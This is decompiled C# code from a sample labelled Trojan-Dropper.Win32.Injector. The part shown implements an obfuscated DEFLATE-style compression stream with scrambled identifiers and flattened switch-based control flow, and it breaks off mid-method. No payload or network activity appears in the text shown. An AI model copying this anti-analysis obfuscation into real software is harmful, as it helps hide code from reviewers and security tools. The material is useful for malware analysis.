// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Msil, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 592E0705-5FE3-456B-BE3B-BDC64BF0EA12
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Dropper.Win32.Injector.bohb-8459fa9a1d18ad0edf27e23258c967c9e734b43e94385e7834ac8244fbf1249c.exe

using System;
using System.Collections;
using System.IO;

internal sealed class \uE00F
{
  public sealed class \uE000 : Stream, IDisposable
  {
    private const int \uE000 = 8192;
    private Stream \uE001;
    private bool \uE002;
    private bool \uE003;
    private \uE00F.\uE008 \uE004;
    private byte[] \uE005;
    private int \uE006;

    public \uE000(Stream _param1)
      : this(_param1, false)
    {
    }

    public \uE000(Stream _param1, bool _param2)
    {
      this.\uE001 = (_param1 == null ? 0 : 1) != 0 ? _param1 : throw new ArgumentNullException();
label_4:
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\uE004 = new \uE00F.\uE008(_param1);
            num = 4;
            continue;
          case 1:
            this.\uE002 = _param2;
            num = 2;
            continue;
          case 2:
            this.\uE003 = true;
            num = 3;
            continue;
          case 3:
            this.\uE005 = new byte[8192];
            num = 0;
            continue;
          case 4:
            goto label_9;
          default:
            goto label_4;
        }
      }
label_9:;
    }

    public Stream \uE000 => this.\uE001;

    public override bool CanSeek => false;

    public override bool CanRead => false;

    public override bool CanWrite => true;

    public override long Length => throw new NotImplementedException();

    public override long Position
    {
      get => throw new NotImplementedException();
      set => throw new NotImplementedException();
    }

    public override long Seek(long offset, SeekOrigin origin) => throw new NotImplementedException();

    public override void SetLength(long value) => throw new NotImplementedException();

    private void \uE000()
    {
      if (!this.\uE003)
        throw new InvalidOperationException("Stream is closed.");
    }

    public override int Read(byte[] buffer, int offset, int count) => throw new NotSupportedException();

    public override void Write(byte[] buffer, int offset, int count)
    {
      if ((count >= 0 ? 0 : 1) != 0 || count > buffer.Length)
        throw new ArgumentOutOfRangeException(nameof (count));
      if (offset < 0 || offset > buffer.Length)
        throw new ArgumentOutOfRangeException(nameof (offset));
      if (offset + count > buffer.Length)
        throw new ArgumentException("offset + count out of buffer");
      this.\uE000();
      if (this.\uE006 + count > 8192)
        this.\uE001();
      if (count >= 8192)
      {
        int num;
        for (num = 0; count - num > 32768; num += 32768)
          this.\uE004.\uE002(buffer, offset + num, 32768, false);
        this.\uE004.\uE002(buffer, offset + num, count - num, false);
      }
      else
      {
        Array.Copy((Array) buffer, offset, (Array) this.\uE005, this.\uE006, count);
label_15:
        int num = 1;
        while (true)
        {
          switch (num)
          {
            case 0:
              if (this.\uE006 == 8192)
              {
                num = 2;
                continue;
              }
              goto label_19;
            case 1:
              this.\uE006 += count;
              num = 0;
              continue;
            case 2:
              goto label_20;
            default:
              goto label_15;
          }
        }
label_19:
        return;
label_20:
        this.\uE001();
      }
    }

    private void \uE001()
    {
      if (this.\uE006 <= 0)
        return;
label_2:
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\uE004.\uE002(this.\uE005, 0, this.\uE006, false);
            num = 1;
            continue;
          case 1:
            goto label_5;
          default:
            goto label_2;
        }
      }
label_5:
      this.\uE006 = 0;
    }

    public override void Flush()
    {
      this.\uE000();
label_2:
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            if (this.\uE006 > 0)
            {
              num = 1;
              continue;
            }
            goto label_6;
          case 1:
            goto label_5;
          default:
            goto label_2;
        }
      }
label_5:
      this.\uE001();
label_6:
      this.\uE004.\uE001(true, false);
      this.\uE000.Flush();
    }

    private void \uE002()
    {
      if (this.\uE006 > 0)
      {
label_2:
        int num = 0;
        while (true)
        {
          switch (num)
          {
            case 0:
              this.\uE004.\uE002(this.\uE005, 0, this.\uE006, true);
              num = 1;
              continue;
            case 1:
              goto label_4;
            default:
              goto label_2;
          }
        }
label_4:;
      }
      else
        this.\uE004.\uE001(false, true);
    }

    void IDisposable.Dispose()
    {
      if ((!this.\uE003 ? 1 : 0) == 0)
      {
        this.\uE002();
label_3:
        int num = 0;
        while (true)
        {
          switch (num)
          {
            case 0:
              this.\uE005 = (byte[]) null;
              num = 2;
              continue;
            case 1:
              if (!this.\uE002)
              {
                num = 3;
                continue;
              }
              goto label_10;
            case 2:
              this.\uE004 = (\uE00F.\uE008) null;
              num = 1;
              continue;
            case 3:
              this.\uE001.Close();
              num = 4;
              continue;
            case 4:
              goto label_9;
            default:
              goto label_3;
          }
        }
label_9:
        this.\uE001 = (Stream) null;
label_10:
        this.\uE003 = false;
      }
      this.Close();
    }
  }

  private sealed class \uE008
  {
    public const int \uE000 = 32768;
    private Stream \uE001;
    private \uE00F.\uE00E \uE002;
    private \uE00F.\uE00A \uE003;

    public \uE008(Stream _param1)
    {
      this.\uE001 = (_param1 == null ? 0 : 1) != 0 ? _param1 : throw new ArgumentNullException();
label_5:
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\uE002 = new \uE00F.\uE00E(_param1);
            num = 1;
            continue;
          case 1:
            this.\uE003 = new \uE00F.\uE00A();
            num = 2;
            continue;
          case 2:
            goto label_4;
          default:
            goto label_5;
        }
      }
label_4:;
    }

    public Stream \uE000 => this.\uE001;

    internal void \uE000(
      \uE00F.\uE00D _param1,
      out int[] _param2,
      out int[] _param3,
      out int _param4)
    {
      _param2 = new int[286];
      _param3 = new int[30];
      _param4 = 0;
      int index1 = 0;
      int index2 = 0;
      if ((index2 == 0 ? 1 : 0) != 0)
        goto label_10;
label_1:
      ushort index3 = (ushort) _param1.\uE000[index1];
      if (index3 <= (ushort) 256)
      {
        ++_param2[(int) index3];
        ++index1;
      }
      else
      {
        ++_param2[(int) index3];
label_5:
        int num = 0;
        while (true)
        {
          switch (num)
          {
            case 0:
              ++_param3[(int) (ushort) _param1.\uE000[index1 + 2]];
              num = 2;
              continue;
            case 1:
              _param4 += (int) (byte) _param1.\uE001[index2] + (int) (byte) _param1.\uE001[index2 + 1];
              num = 3;
              continue;
            case 2:
              index1 += 4;
              num = 1;
              continue;
            case 3:
              goto label_9;
            default:
              goto label_5;
          }
        }
label_9:
        index2 += 2;
      }
label_10:
      if (index1 < _param1.\uE000.Count)
        goto label_1;
    }

    public void \uE001(bool _param1, bool _param2)
    {
      this.\uE002.\uE000(_param2);
      if ((!_param1 ? 1 : 0) == 0)
      {
        this.\uE002.\uE001(0, 2);
label_3:
        int num = 0;
        while (true)
        {
          switch (num)
          {
            case 0:
              this.\uE002.\uE003();
              num = 2;
              continue;
            case 1:
              this.\uE002.\uE001((int) ushort.MaxValue, 16);
              num = 3;
              continue;
            case 2:
              this.\uE002.\uE001(0, 16);
              num = 1;
              continue;
            case 3:
              goto label_8;
            default:
              goto label_3;
          }
        }
      }
      else
      {
        this.\uE002.\uE001(1, 2);
        \uE00B obj = \uE00A.\uE011[256];
        this.\uE002.\uE002(obj.\uE000, obj.\uE001);
      }
label_8:
      if (!_param2)
        return;
      this.\uE002.\uE003();
    }

    public void \uE002(byte[] _param1, int _param2, int _param3, bool _param4)
    {
      if (_param3 > 32768)
        throw new ArgumentOutOfRangeException();
      \uE00F.\uE00D obj = this.\uE003.\uE000(_param1, _param2, _param3);
      if ((obj == null ? 0 : 1) == 0)
        throw new InvalidOperationException();
      if (obj.\uE002 != _param3)
        throw new InvalidOperationException();
      obj.\uE002();
      int[] numArray1;
      int[] numArray2;
      int num1;
      this.\uE000(obj, out numArray1, out numArray2, out num1);
      int[] numArray3 = \uE00A.\uE00B(numArray1);
      int[] numArray4 = \uE00A.\uE00B(numArray2);
      int num2 = (4 + _param3) * 8;
      int num3 = this.\uE002.\uE001 >= 3 ? num2 + (this.\uE002.\uE001 - 3) : num2 + (5 + this.\uE002.\uE001);
      int num4 = \uE00A.\uE000(numArray3, numArray1) + \uE00A.\uE000(numArray4, numArray2) + num1;
      int num5 = \uE00A.\uE001(numArray3, numArray4) + num1;
      bool flag1 = num5 <= num4 || num3 <= num4;
      if (!flag1)
      {
        int num6 = num4 + this.\uE006(numArray3, numArray4);
        flag1 = num5 <= num6 || num3 <= num6;
      }
      bool flag2 = num3 < num5;
      this.\uE002.\uE000(_param4);
      if (flag2 && flag1)
      {
        this.\uE002.\uE001(0, 2);
label_11:
        int num7 = 3;
        int num8;
        int num9;
        while (true)
        {
          switch (num7)
          {
            case 0:
              this.\uE002.\uE003();
              num7 = 6;
              continue;
            case 1:
              this.\uE002.\uE001(num8, 16);
              num7 = 2;
              continue;
            case 2:
              this.\uE002.\uE001(num9, 16);
              num7 = 0;
              continue;
            case 3:
              this.\uE002.\uE003();
              num7 = 5;
              continue;
            case 4:
              num9 = ~_param3 & (int) ushort.MaxValue;
              num7 = 1;
              continue;
            case 5:
              num8 = _param3;
              num7 = 4;
              continue;
            case 6:
              this.\uE004(_param1, _param2, _param3);
              num7 = 7;
              continue;
            case 7:
              goto label_23;
            default:
              goto label_11;
          }
        }
      }
      else
      {
        \uE00B[] objArray1;
        \uE00B[] objArray2;
        if (flag1)
        {
          this.\uE002.\uE001(1, 2);
          objArray1 = \uE00A.\uE011;
          objArray2 = \uE00A.\uE012;
        }
        else
        {
          this.\uE002.\uE001(2, 2);
          this.\uE005(numArray3, numArray4);
          objArray1 = \uE00A.\uE002(numArray3);
          objArray2 = \uE00A.\uE002(numArray4);
        }
        this.\uE003(obj, objArray1, objArray2);
      }
label_23:
      if (!_param4)
        return;
      this.\uE002.\uE003();
    }

    private void \uE003(\uE00F.\uE00D _param1, \uE00B[] _param2, \uE00B[] _param3)
    {
      int index1 = 0;
      int index2 = 0;
      if ((index2 == 0 ? 1 : 0) != 0)
        goto label_15;
label_1:
      int index3 = (int) (ushort) _param1.\uE000[index1];
      if (index3 <= 256)
      {
        \uE00B obj = _param2[index3];
        this.\uE002.\uE002(obj.\uE000, obj.\uE001);
        ++index1;
      }
      else
      {
        \uE00B obj = _param2[index3];
        this.\uE002.\uE002(obj.\uE000, obj.\uE001);
        if ((byte) _param1.\uE001[index2] > (byte) 0)
          this.\uE002.\uE001((int) (ushort) _param1.\uE000[index1 + 1], (int) (byte) _param1.\uE001[index2]);
        int index4 = index1 + 2;
label_7:
        int num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
              obj = _param3[(int) (ushort) _param1.\uE000[index4]];
              num = 2;
              continue;
            case 1:
              if ((byte) _param1.\uE001[index2] > (byte) 0)
              {
                num = 4;
                continue;
              }
              goto label_14;
            case 2:
              this.\uE002.\uE002(obj.\uE000, obj.\uE001);
              num = 1;
              continue;
            case 3:
              ++index2;
              num = 0;
              continue;
            case 4:
              goto label_13;
            default:
              goto label_7;
          }
        }
label_13:
        this.\uE002.\uE001((int) (ushort) _param1.\uE000[index4 + 1], (int) (byte) _param1.\uE001[index2]);
label_14:
        index1 = index4 + 2;
        ++index2;
      }
label_15:
      if (index1 < _param1.\uE000.Count)
        goto label_1;
    }

    private void \uE004(byte[] _param1, int _param2, int _param3) => this.\uE000.Write(_param1, _param2, _param3);

    private void \uE005(int[] _param1, int[] _param2)
    {
      int[] numArray1 = new int[19];
      int num1 = 286;
      if ((num1 == 0 ? 0 : 1) != 0)
        goto label_2;
label_1:
      --num1;
label_2:
      if (num1 <= 257 || _param1[num1 - 1] != 0)
      {
        int length = 30;
        while (length > 1 && _param2[length - 1] == 0)
          --length;
        int[] destinationArray = new int[num1 + length];
        Array.Copy((Array) _param1, 0, (Array) destinationArray, 0, num1);
        Array.Copy((Array) _param2, 0, (Array) destinationArray, num1, length);
        int[] numArray2 = \uE00A.\uE00D(destinationArray, 0, destinationArray.Length);
        for (int index = 0; index < numArray2.Length; ++index)
        {
          ++numArray1[numArray2[index]];
          if (numArray2[index] >= 16)
            ++index;
        }
        int[] numArray3 = \uE00A.\uE00A(numArray1, 7);
        int[] numArray4 = \uE00A.\uE014;
        int num2 = 19;
        while (num2 > 4 && numArray3[numArray4[num2 - 1]] == 0)
          --num2;
        int num3 = num1 - 257;
label_16:
        int num4 = 2;
        int num5;
        int num6;
        \uE00B[] objArray;
        int index1;
        while (true)
        {
          switch (num4)
          {
            case 0:
              this.\uE002.\uE001(num3, 5);
              num4 = 5;
              continue;
            case 1:
              num5 = num2 - 4;
              num4 = 4;
              continue;
            case 2:
              num6 = length - 1;
              num4 = 1;
              continue;
            case 3:
              this.\uE002.\uE001(num5, 4);
              num4 = 6;
              continue;
            case 4:
              objArray = \uE00A.\uE002(numArray3);
              num4 = 0;
              continue;
            case 5:
              this.\uE002.\uE001(num6, 5);
              num4 = 3;
              continue;
            case 6:
              index1 = 0;
              num4 = 7;
              continue;
            case 7:
              goto label_26;
            default:
              goto label_16;
          }
        }
label_26:
        for (; index1 < num2; ++index1)
          this.\uE002.\uE001(numArray3[numArray4[index1]], 3);
        for (int index2 = 0; index2 < numArray2.Length; ++index2)
        {
          int index3 = numArray2[index2];
          \uE00B obj = objArray[index3];
          this.\uE002.\uE002(obj.\uE000, obj.\uE001);
          if (index3 >= 16)
          {
            ++index2;
            this.\uE002.\uE001(numArray2[index2], \uE00A.\uE00C(index3));
          }
        }
      }
      else
        goto label_1;
    }

    private int \uE006(int[] _param1, int[] _param2)
    {
      int[] numArray1 = new int[19];
      int num1 = 0;
      int num2 = 286;
      if ((num2 == 0 ? 0 : 1) != 0)
        goto label_2;
label_1:
      --num2;
label_2:
      if (num2 <= 257 || _param1[num2 - 1] != 0)
      {
        int[] numArray2 = \uE00A.\uE00D(_param1, 0, num2);
label_12:
        for (int index = 0; index < numArray2.Length; ++index)
        {
          ++numArray1[numArray2[index]];
label_6:
          int num3 = 0;
          while (true)
          {
            switch (num3)
            {
              case 0:
                if (numArray2[index] >= 16)
                {
                  num3 = 1;
                  continue;
                }
                goto label_12;
              case 1:
                num1 += \uE00A.\uE00C(numArray2[index]);
                num3 = 2;
                continue;
              case 2:
                goto label_10;
              default:
                goto label_6;
            }
          }
label_10:
          ++index;
        }
        int num4 = 30;
        while (num4 > 1 && _param2[num4 - 1] == 0)
          --num4;
        int[] numArray3 = \uE00A.\uE00D(_param2, 0, num4);
        for (int index = 0; index < numArray3.Length; ++index)
        {
          ++numArray1[numArray3[index]];
          if (numArray3[index] >= 16)
          {
            num1 += \uE00A.\uE00C(numArray3[index]);
            ++index;
          }
        }
        int[] numArray4 = \uE00A.\uE00B(numArray1);
        int num5 = \uE00A.\uE000(numArray1, numArray4);
        int[] numArray5 = \uE00A.\uE014;
        int num6 = 19;
        while (num6 > 4 && numArray4[numArray5[num6 - 1]] == 0)
          --num6;
        return 14 + (num6 - 4 + 4) * 3 + num5 + num1;
      }
      goto label_1;
    }
  }

  private sealed class \uE009
  {
    public static readonly \uE00F.\uE009 \uE000;
    public int \uE001;
    public int \uE002;
    public int \uE003;
    public int \uE004;

    static \uE009()
    {
      \uE00F.\uE009 obj = new \uE00F.\uE009();
label_2:
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
            obj.\uE002 = 32;
            num = 1;
            continue;
          case 1:
            obj.\uE003 = 128;
            num = 3;
            continue;
          case 2:
            obj.\uE001 = 8;
            num = 0;
            continue;
          case 3:
            obj.\uE004 = 256;
            num = 4;
            continue;
          case 4:
            \uE00F.\uE009.\uE000 = obj;
            num = 5;
            continue;
          case 5:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:;
    }
  }

  private sealed class \uE00A
  {
    private const int \uE000 = 258;
    private const int \uE001 = 32768;
    private \uE00F.\uE00C \uE002;
    private \uE00F.\uE00B \uE003;
    private \uE00F.\uE009 \uE004;
    private int \uE005;

    internal \uE00A()
      : this(\uE00F.\uE009.\uE000)
    {
    }

    internal \uE00A(\uE00F.\uE009 _param1)
    {
      this.\uE004 = _param1;
label_2:
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\uE003 = new \uE00F.\uE00B(32768);
            num = 1;
            continue;
          case 1:
            this.\uE005 = 0;
            num = 3;
            continue;
          case 2:
            this.\uE002 = new \uE00F.\uE00C(65536);
            num = 0;
            continue;
          case 3:
            goto label_6;
          default:
            goto label_2;
        }
      }
label_6:;
    }

    internal \uE00F.\uE009 \uE000 => this.\uE004;

    public \uE00F.\uE00D \uE000(byte[] _param1, int _param2, int _param3)
    {
      if (this.\uE002.\uE002 + _param3 > this.\uE002.\uE001)
      {
        int num = this.\uE002.\uE002 - 32768;
        this.\uE002.\uE001(num);
        if ((this.\uE005 >= num ? 0 : 1) == 0)
        {
          this.\uE005 -= num;
        }
        else
        {
          this.\uE003.\uE003(num - this.\uE005);
          this.\uE005 = 0;
        }
      }
      int num1 = this.\uE002.\uE002;
label_6:
      int num2 = 1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            if (this.\uE005 < num1)
            {
              num2 = 2;
              continue;
            }
            goto label_11;
          case 1:
            this.\uE002.\uE000(_param1, _param2, _param3);
            num2 = 0;
            continue;
          case 2:
            goto label_10;
          default:
            goto label_6;
        }
      }
label_10:
      this.\uE003.\uE002(this.\uE002.\uE000, this.\uE005, num1 - this.\uE005);
label_11:
      return this.\uE000.\uE003 > 0 ? this.\uE002(this.\uE003, this.\uE002.\uE000, num1, _param3, out this.\uE005) : this.\uE001(this.\uE002.\uE000, num1, _param3);
    }

    private \uE00F.\uE00D \uE001(byte[] _param1, int _param2, int _param3)
    {
      \uE00F.\uE00D obj = new \uE00F.\uE00D();
label_2:
      int num1 = 2;
      int index;
      while (true)
      {
        switch (num1)
        {
          case 0:
            index = 0;
            num1 = 1;
            continue;
          case 1:
            if (index != 0)
            {
              num1 = 3;
              continue;
            }
            goto label_8;
          case 2:
            obj.\uE000.Capacity = _param3 + 1;
            num1 = 0;
            continue;
          case 3:
            goto label_7;
          default:
            goto label_2;
        }
      }
label_7:
      int num2 = 0;
      goto label_9;
label_8:
      num2 = 1;
label_9:
      if (num2 != 0)
        goto label_11;
label_10:
      obj.\uE000(_param1[index]);
      ++index;
label_11:
      if (index >= _param3)
        return obj;
      goto label_10;
    }

    private \uE00F.\uE00D \uE002(
      \uE00F.\uE00B _param1,
      byte[] _param2,
      int _param3,
      int _param4,
      out int _param5)
    {
      \uE00F.\uE00D obj1 = new \uE00F.\uE00D();
      object obj2 = (object) null;
      int num1 = 0;
      if ((num1 == 0 ? 1 : 0) != 0)
        goto label_18;
label_1:
      \uE00F.\uE00B.\uE000 obj3 = _param1.\uE000(_param2, _param3 + num1);
      if (obj3 != null)
      {
        object obj4;
        if (obj2 != null)
        {
          obj4 = obj2;
          obj2 = (object) null;
        }
        else
          obj4 = (object) this.\uE003(_param2, _param3, _param4, num1, obj3, 3);
        \uE00F.\uE00A.\uE000 obj5 = (\uE00F.\uE00A.\uE000) obj4;
        bool flag = obj5.\uE001 >= 3;
        if (flag && num1 < _param4 - 3 && obj5.\uE001 < this.\uE004.\uE002)
        {
          \uE00F.\uE00B.\uE000 obj6 = _param1.\uE000(_param2, _param3 + num1 + 1);
          if (obj6 != null)
          {
            \uE00F.\uE00A.\uE000 obj7 = this.\uE003(_param2, _param3, _param4, num1 + 1, obj6, obj5.\uE001 + 1);
            if (obj7.\uE001 > obj5.\uE001)
            {
              obj2 = (object) obj7;
              flag = false;
            }
          }
        }
        if (flag)
        {
          obj1.\uE001(num1 - obj5.\uE000, obj5.\uE001);
label_12:
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num1 += obj5.\uE001;
                num2 = 1;
                continue;
              case 1:
                _param1.\uE003(obj5.\uE001 - 1);
                num2 = 3;
                continue;
              case 2:
                _param1.\uE001(_param2, _param3 + num1);
                num2 = 0;
                continue;
              case 3:
                goto label_18;
              default:
                goto label_12;
            }
          }
        }
        else
        {
          obj1.\uE000(_param2[_param3 + num1]);
          _param1.\uE001(_param2, _param3 + num1);
          ++num1;
        }
      }
      else
      {
        obj1.\uE000(_param2[_param3 + num1]);
        _param1.\uE001(_param2, _param3 + num1);
        ++num1;
      }
label_18:
      if (num1 >= _param4 - 2)
      {
        _param5 = _param3 + num1;
        for (; num1 < _param4; ++num1)
          obj1.\uE000(_param2[_param3 + num1]);
        return obj1;
      }
      goto label_1;
    }

    private \uE00F.\uE00A.\uE000 \uE003(
      byte[] _param1,
      int _param2,
      int _param3,
      int _param4,
      \uE00F.\uE00B.\uE000 _param5,
      int _param6)
    {
      int num1 = this.\uE004.\uE004;
label_2:
      int num2 = 4;
      int num3;
      int num4;
      int num5;
      int num6;
      int num7;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num3 = _param2 + _param4;
            num2 = 5;
            continue;
          case 1:
            num4 = -1;
            num2 = 3;
            continue;
          case 2:
            num5 = _param6 - 1;
            num2 = 0;
            continue;
          case 3:
            num6 = 0;
            num2 = 2;
            continue;
          case 4:
            num7 = 0;
            num2 = 1;
            continue;
          case 5:
            goto label_17;
          default:
            goto label_2;
        }
      }
label_17:
      while (_param5.\uE000())
      {
        int num8 = 0;
        int num9 = _param4 - _param5.\uE000;
        if (_param4 + num5 < _param3)
        {
          int num10 = _param2 + num9;
          if ((int) _param1[num10 + num5] == (int) _param1[num3 + num5])
          {
            while (num8 < 258 && _param4 + num8 < _param3 && (int) _param1[num10 + num8] == (int) _param1[num3 + num8])
              ++num8;
            if ((num8 >= num7 ? 0 : 1) == 0)
            {
              num7 = num8;
              num5 = num8;
              num4 = num9;
              if (num7 >= this.\uE004.\uE003)
                break;
            }
            if (num7 >= this.\uE004.\uE001)
              num1 >>= 2;
          }
          if (++num6 >= num1)
            break;
        }
        else
          break;
      }
      return new \uE00F.\uE00A.\uE000()
      {
        \uE001 = num7,
        \uE000 = num4
      };
    }

    private struct \uE000
    {
      public int \uE000;
      public int \uE001;
    }
  }

  private sealed class \uE00B
  {
    private const int \uE000 = 16777216;
    private const int \uE001 = 256;
    private const ushort \uE002 = 65535;
    private const ushort \uE003 = 0;
    private int \uE004;
    private ushort[] \uE005;
    private int[] \uE006;
    private int \uE007;

    internal \uE00B(int _param1)
    {
      this.\uE004 = _param1;
label_2:
      int num1 = 0;
      int index;
      while (true)
      {
        switch (num1)
        {
          case 0:
            this.\uE005 = new ushort[this.\uE004];
            num1 = 1;
            continue;
          case 1:
            this.\uE006 = new int[256];
            num1 = 3;
            continue;
          case 2:
            if (index != 0)
            {
              num1 = 4;
              continue;
            }
            goto label_9;
          case 3:
            index = 0;
            num1 = 2;
            continue;
          case 4:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num2 = 0;
      goto label_10;
label_9:
      num2 = 1;
label_10:
      if (num2 != 0)
        goto label_12;
label_11:
      this.\uE006[index] = (int) ushort.MaxValue;
      ++index;
label_12:
      if (index < 256)
        goto label_11;
    }

    internal \uE00F.\uE00B.\uE000 \uE000(byte[] _param1, int _param2)
    {
      int index = \uE00F.\uE00B.\uE004(_param1, _param2);
label_2:
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            if (this.\uE006[index] != (int) ushort.MaxValue)
            {
              num = 1;
              continue;
            }
            goto label_7;
          case 1:
            if (this.\uE007 - this.\uE006[index] > this.\uE004)
            {
              num = 2;
              continue;
            }
            goto label_8;
          case 2:
            goto label_7;
          default:
            goto label_2;
        }
      }
label_7:
      return (\uE00F.\uE00B.\uE000) null;
label_8:
      return new \uE00F.\uE00B.\uE000(this, this.\uE007 - this.\uE006[index]);
    }

    internal void \uE001(byte[] _param1, int _param2)
    {
      int index1 = \uE00F.\uE00B.\uE004(_param1, _param2);
      this.\uE005[this.\uE007 % this.\uE004] = this.\uE006[index1] == (int) ushort.MaxValue || (this.\uE007 - this.\uE006[index1] >= this.\uE004 ? 0 : 1) == 0 ? (ushort) 0 : (ushort) (this.\uE007 - this.\uE006[index1]);
      this.\uE006[index1] = this.\uE007;
label_2:
      int num1 = 3;
      int num2;
      int index2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num2 = this.\uE007 - this.\uE004;
            num1 = 4;
            continue;
          case 1:
            index2 = 0;
            num1 = 5;
            continue;
          case 2:
            if (num3 >= 16777216)
            {
              num1 = 0;
              continue;
            }
            goto label_14;
          case 3:
            num3 = ++this.\uE007;
            num1 = 2;
            continue;
          case 4:
            num2 -= num2 % this.\uE004;
            num1 = 1;
            continue;
          case 5:
            goto label_13;
          default:
            goto label_2;
        }
      }
label_14:
      return;
label_13:
      for (; index2 < this.\uE006.Length; ++index2)
      {
        if (this.\uE006[index2] >= num2)
          this.\uE006[index2] -= num2;
        else
          this.\uE006[index2] = 0;
      }
      this.\uE007 -= num2;
    }

    internal void \uE002(byte[] _param1, int _param2, int _param3)
    {
      int num1 = 0;
      if ((num1 == 0 ? 1 : 0) != 0)
        goto label_6;
      else
        goto label_3;
label_2:
      int num2;
      switch (num2)
      {
        case 0:
          goto label_4;
        case 1:
          ++num1;
          goto label_6;
      }
label_3:
      num2 = 0;
      goto label_2;
label_4:
      this.\uE001(_param1, _param2 + num1);
      num2 = 1;
      goto label_2;
label_6:
      if (num1 < _param3)
        goto label_4;
    }

    internal void \uE003(int _param1) => this.\uE007 += _param1;

    private static int \uE004(byte[] _param0, int _param1) => (int) (byte) ((uint) _param0[_param1] + (uint) _param0[_param1 + 1] + (uint) _param0[_param1 + 2]);

    internal sealed class \uE000
    {
      private \uE00F.\uE00B \uE000;
      private int \uE001;
      private int \uE002;

      internal \uE000(\uE00F.\uE00B _param1, int _param2)
      {
        this.\uE000 = _param1;
        this.\uE001 = _param2;
      }

      internal int \uE000 => this.\uE001;

      internal bool \uE000()
      {
        if ((this.\uE002 == 0 ? 0 : 1) == 0)
        {
          this.\uE002 = 1;
          return true;
        }
        if (this.\uE002 == 1)
        {
          ushort num1 = this.\uE000.\uE005[(this.\uE000.\uE007 - this.\uE001) % this.\uE000.\uE004];
label_5:
          int num2 = 1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                if (this.\uE001 <= this.\uE000.\uE004)
                {
                  num2 = 3;
                  continue;
                }
                goto label_12;
              case 1:
                if (num1 != (ushort) 0)
                {
                  num2 = 2;
                  continue;
                }
                goto label_12;
              case 2:
                this.\uE001 += (int) num1;
                num2 = 0;
                continue;
              case 3:
                goto label_11;
              default:
                goto label_5;
            }
          }
label_11:
          return true;
label_12:
          this.\uE002 = 2;
        }
        return false;
      }
    }
  }

  private sealed class \uE00C
  {
    private int \uE000;
    private byte[] \uE001;
    private int \uE002;

    public \uE00C(int _param1)
    {
      this.\uE000 = _param1;
      this.\uE001 = new byte[_param1];
      this.\uE002 = 0;
    }

    public byte[] \uE000 => this.\uE001;

    public int \uE001 => this.\uE000;

    public int \uE002 => this.\uE002;

    public void \uE000(byte[] _param1, int _param2, int _param3)
    {
      Array.Copy((Array) _param1, _param2, (Array) this.\uE001, this.\uE002, _param3);
label_2:
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\uE002 += _param3;
            num = 1;
            continue;
          case 1:
            goto label_4;
          default:
            goto label_2;
        }
      }
label_4:;
    }

    public void \uE001(int _param1)
    {
      Array.Copy((Array) this.\uE001, _param1, (Array) this.\uE001, 0, this.\uE002 - _param1);
label_2:
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\uE002 -= _param1;
            num = 1;
            continue;
          case 1:
            goto label_4;
          default:
            goto label_2;
        }
      }
label_4:;
    }
  }

  private sealed class \uE00D
  {
    internal ArrayList \uE000 = new ArrayList();
    internal ArrayList \uE001 = new ArrayList();
    internal int \uE002;

    public void \uE000(byte _param1)
    {
      this.\uE000.Add((object) (ushort) _param1);
      ++this.\uE002;
    }

    public void \uE001(int _param1, int _param2)
    {
      if ((_param1 >= 1 ? 0 : 1) != 0 || _param1 > 32768)
        throw new ArgumentOutOfRangeException();
      if (_param2 < 3 || _param2 > 258)
        throw new ArgumentOutOfRangeException();
      int num1;
      int num2;
      int num3;
      \uE00A.\uE008(_param2, out num1, out num2, out num3);
label_6:
      int num4 = 6;
      int num5;
      int num6;
      int num7;
      while (true)
      {
        switch (num4)
        {
          case 0:
            this.\uE000.Add((object) (ushort) num2);
            num4 = 4;
            continue;
          case 1:
            this.\uE000.Add((object) (ushort) num5);
            num4 = 7;
            continue;
          case 2:
            this.\uE000.Add((object) (ushort) num1);
            num4 = 0;
            continue;
          case 3:
            this.\uE001.Add((object) (byte) num6);
            num4 = 5;
            continue;
          case 4:
            this.\uE001.Add((object) (byte) num3);
            num4 = 1;
            continue;
          case 5:
            this.\uE002 += _param2;
            num4 = 8;
            continue;
          case 6:
            \uE00A.\uE009(_param1, out num5, out num7, out num6);
            num4 = 2;
            continue;
          case 7:
            this.\uE000.Add((object) (ushort) num7);
            num4 = 3;
            continue;
          case 8:
            goto label_15;
          default:
            goto label_6;
        }
      }
label_15:;
    }

    internal void \uE002() => this.\uE000.Add((object) (ushort) 256);
  }

  private sealed class \uE00E
  {
    private uint \uE000;
    private int \uE001;
    private Stream \uE002;

    internal \uE00E(Stream _param1) => this.\uE002 = _param1;

    internal Stream \uE000 => this.\uE002;

    internal int \uE001 => (32 - this.\uE001) % 8;

    internal void \uE000(bool _param1) => this.\uE001(_param1 ? 1 : 0, 1);

    internal void \uE001(int _param1, int _param2)
    {
      uint num1 = this.\uE000 | checked ((uint) _param1) << this.\uE001;
      int num2;
      for (num2 = this.\uE001 + _param2; num2 >= 8; num2 -= 8)
      {
        this.\uE000.WriteByte((byte) num1);
        num1 >>= 8;
      }
label_5:
      int num3 = 0;
      while (true)
      {
        switch (num3)
        {
          case 0:
            this.\uE000 = num1;
            num3 = 1;
            continue;
          case 1:
            this.\uE001 = num2;
            num3 = 2;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:;
    }

    internal void \uE002(int _param1, int _param2)
    {
      int num1 = 0;
label_7:
      for (int index = _param2 - 1; index >= 0; --index)
      {
        num1 <<= 1;
label_3:
        int num2 = 0;
